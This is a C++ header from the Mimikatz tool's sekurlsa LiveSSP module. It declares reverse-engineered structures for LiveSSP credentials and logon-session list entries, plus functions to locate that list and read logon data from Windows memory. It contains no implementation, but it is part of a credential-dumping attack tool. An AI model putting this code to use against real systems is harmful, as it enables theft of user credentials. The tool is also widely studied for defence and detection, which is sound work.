/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#pragma once
#include "../mod_mimikatz_sekurlsa.h"

class mod_mimikatz_sekurlsa_livessp {

private:
	typedef struct _KIWI_LIVESSP_PRIMARY_CREDENTIAL
	{
		DWORD isSupp;	// 88h
		DWORD unk0;
		KIWI_GENERIC_PRIMARY_CREDENTIAL credentials;
	} KIWI_LIVESSP_PRIMARY_CREDENTIAL, *PKIWI_LIVESSP_PRIMARY_CREDENTIAL;

	typedef struct _KIWI_LIVESSP_LIST_ENTRY
	{
		struct _KIWI_LIVESSP_LIST_ENTRY *Flink;
		struct _KIWI_LIVESSP_LIST_ENTRY *Blink;
		PVOID	unk0;	// 1
		PVOID	unk1;	// 0FFFFFFFFh
		PVOID	unk2;	// 0FFFFFFFFh
		PVOID	unk3;	// 0
		DWORD	unk4;	// 0
		DWORD	unk5;	// 0
		PVOID	unk6;	// 20007D0h
		LUID	LocallyUniqueIdentifier;
		LSA_UNICODE_STRING UserName;
		PVOID	unk7;	// 2000010Dh
		PKIWI_LIVESSP_PRIMARY_CREDENTIAL suppCreds;
	} KIWI_LIVESSP_LIST_ENTRY, *PKIWI_LIVESSP_LIST_ENTRY;

	static PKIWI_LIVESSP_LIST_ENTRY LiveGlobalLogonSessionList;
	static bool searchLiveGlobalLogonSessionList();

public:
	static mod_process::PKIWI_VERY_BASIC_MODULEENTRY pModLIVESSP;
	static bool getLiveSSP(vector<wstring> * arguments);
	static bool WINAPI getLiveSSPLogonData(__in PLUID logId, __in bool justSecurity);
};
